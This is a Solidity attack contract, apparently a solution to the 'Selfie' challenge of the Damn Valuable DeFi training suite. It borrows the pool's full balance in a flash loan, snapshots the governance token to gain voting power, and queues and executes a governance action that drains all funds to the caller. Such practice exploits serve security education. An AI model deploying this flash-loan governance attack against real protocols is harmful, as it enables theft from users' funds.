// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../selfie/SimpleGovernance.sol";

contract SelfieAttack {
    SelfiePool pool;
    ERC20Snapshot token;
    SimpleGovernance governance;
    uint256 actionId;

    constructor(address _selfiePoolAddress) {
        pool = SelfiePool(_selfiePoolAddress);
        token = pool.token();
        governance = pool.governance();
    }

    function queue() public {
        // borrow tokens
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(poolBalance);

        // queue action (drain funds)
        address receiver = address(pool);
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", msg.sender);
        uint256 weiAmount = 0;
        actionId = governance.queueAction(receiver, data, weiAmount);
    }

    function execute() public {
        // borrow tokens
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(poolBalance);

        // execute previously queued action (drain funds)
        governance.executeAction(actionId);
    }

    function receiveTokens(address _tokenAddress, uint256 _borrowAmount) external {
        require(msg.sender == address(pool));

        // take snapshot
        uint256 lastSnapshotId = DamnValuableTokenSnapshot(address(token)).snapshot();

        // pay back loan
        token.transfer(address(pool), _borrowAmount);
    }
}